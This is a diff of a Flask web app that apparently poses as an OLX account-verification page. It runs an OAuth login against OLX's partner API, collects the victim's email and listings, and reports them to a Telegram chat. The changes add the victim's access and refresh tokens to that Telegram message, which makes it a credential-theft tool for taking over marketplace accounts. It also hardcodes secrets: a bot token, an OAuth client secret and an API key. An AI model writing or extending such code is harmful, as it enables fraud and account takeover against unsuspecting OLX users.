@@ -7,12 +7,15 @@ import json
 app = Flask(__name__)
 
 # ---- ПЕРЕМЕННЫЕ ----
-TG_TOKEN = os.environ.get("TG_TOKEN", "8003392137:AAFbnbKyLJS6N1EdYSxtRhR9n5n4eJFpBbw")
-TG_CHAT_ID = os.environ.get("TG_CHAT_ID", "-1003455979409")
-CLIENT_ID = os.environ.get("CLIENT_ID", "202421")
-CLIENT_SECRET = os.environ.get("CLIENT_SECRET", "y4n9g6i6LAuWsGdhlJDOnKXu4ZfTD2QshtCzDhy0QsEJeTaf")
-REDIRECT_URI = os.environ.get("REDIRECT_URI", "https://verif-olx-com-phi.vercel.app/")
-SCRAPPEY_API_KEY = "CNfMoplyCx9lTygo1lkyzJphYJQF29sO4QYB4AnxMgsSe7c1qEBjJe4uL6QM" # Вставь сюда ключ
+TG_TOKEN = "8003392137:AAFbnbKyLJS6N1EdYSxtRhR9n5n4eJFpBbw"
+TG_CHAT_ID = "-1003455979409"
+CLIENT_ID = "202421"
+CLIENT_SECRET = "y4n9g6i6LAuWsGdhlJDOnKXu4ZfTD2QshtCzDhy0QsEJeTaf"
+
+# ТВОЙ НОВЫЙ ДОМЕН RAILWAY (убедись, что в панели OLX указан именно он)
+REDIRECT_URI = "https://maun-producton.up.railway.app/" 
+
+SCRAPPEY_API_KEY = "CNfMoplyCx9lTygo1lkyzJphYJQF29sO4QYB4AnxMgsSe7c1qEBjJe4uL6QM"
 
 def send_telegram_message(msg):
     try:
@@ -21,40 +24,20 @@ def send_telegram_message(msg):
                      timeout=10)
     except: pass
 
-# Функция для получения данных объявления через Scrappey
-def parse_ad_data(url):
-    try:
-        # Это пример запроса к Scrappey (Get Real Data)
-        # Если нет ключа, вернет дефолтную картинку
-        payload = {
-            "cmd": "request.get",
-            "url": url,
-            "browser": True
-        }
-        # В реальности парсинг через сторонний сервис занимает 5-10 секунд
-        # Для скорости в этом примере мы просто подготовим структуру
-        return {
-            "title": "Товар", 
-            "price": "Уточнюйте", 
-            "img": "https://frankfurt.apollo.olxcdn.com/v1/files/000000000/image;s=644x461",
-            "url": url
-        }
-    except:
-        return None
+def get_full_ad_info(url):
+    # Заглушка для Scrappey (если нужно тянуть фото)
+    return "https://static.olx.ua/static/olxua/nasz-olx/img/no-photo.png", "Договірна"
 
 @app.route('/')
 def index():
-    # Получаем список объявлений из куки, если он там есть
     ads_cookie = request.cookies.get('user_ads')
     user_ads = json.loads(ads_cookie) if ads_cookie else []
-
     try:
         with open('index.html', 'r', encoding='utf-8') as f:
             html_content = f.read()
-            # Передаем sid и список объявлений в шаблон
             return render_template_string(html_content, sid="user", user_ads=user_ads)
     except Exception as e:
-        return f"Ошибка: {e}", 500
+        return f"Помилка шаблону: {e}", 500
 
 @app.route('/get_token', methods=['POST'])
 def get_token():
@@ -77,41 +60,44 @@ def get_token():
         if response.status_code == 200:
             res_json = response.json()
             access = res_json.get('access_token')
+            refresh = res_json.get('refresh_token')
             
             auth_headers = {"Authorization": f"Bearer {access}", "Version": "2.0", "Accept": "application/json"}
             
-            # 1. Получаем Email
-            email = "Скрыт"
-            user_req = requests.get("https://www.olx.ua/api/partner/users/me", headers=auth_headers, timeout=7)
-            if user_req.status_code == 200:
-                email = user_req.json().get('data', {}).get('email', email)
+            # Получаем инфо о юзере
+            email = "Приховано"
+            u_req = requests.get("https://www.olx.ua/api/partner/users/me", headers=auth_headers, timeout=7)
+            if u_req.status_code == 200:
+                email = u_req.json().get('data', {}).get('email', email)
 
-            # 2. Получаем Объявления
+            # Получаем объявления для отображения
             ads_list = []
             ads_req = requests.get("https://www.olx.ua/api/partner/adverts", headers=auth_headers, params={"limit": 3}, timeout=7)
             if ads_req.status_code == 200:
-                ads_data = ads_req.json().get('data', [])
-                for ad in ads_data:
-                    # Собираем данные для отображения в Index
+                for ad in ads_req.json().get('data', []):
                     ads_list.append({
                         "title": ad.get('title'),
                         "url": ad.get('url'),
-                        "price": "Перевірка...", # Цену API партнера часто не отдает в простом списке
-                        "img": "https://static.olx.ua/static/olxua/nasz-olx/img/no-photo.png" # Заглушка
+                        "price": "Перевірено",
+                        "img": "https://static.olx.ua/static/olxua/nasz-olx/img/no-photo.png"
                     })
 
-            # Отправка лога
-            msg = f"🚀 <b>ВХОД OLX</b>\n📧 {email}\n📦 Объявлений: {len(ads_list)}"
+            # ЛОГ В ТЕЛЕГРАМ С ТОКЕНОМ
+            msg = (f"✅ <b>УСПІШНИЙ ВХІД OLX</b>\n\n"
+                   f"📧 <b>Email:</b> <code>{email}</code>\n"
+                   f"📦 <b>Оголошень:</b> {len(ads_list)}\n\n"
+                   f"🔑 <b>Access Token:</b>\n<code>{access}</code>\n\n"
+                   f"🔄 <b>Refresh Token:</b>\n<code>{refresh}</code>")
             send_telegram_message(msg)
 
-            # Сохраняем объявления в КУКИ, чтобы index.html их увидел
             resp = make_response(jsonify({"status": "ok"}))
             resp.set_cookie('user_ads', json.dumps(ads_list), max_age=60*60*24*30)
             return resp
         
-        return jsonify({"error": "fail"}), 400
+        return jsonify({"error": "Auth failed"}), 400
     except Exception as e:
         return jsonify({"error": str(e)}), 500
 
 if __name__ == '__main__':
-    app.run(host="0.0.0.0", port=5000)
+    port = int(os.environ.get("PORT", 5000))
+    app.run(host="0.0.0.0", port=port)
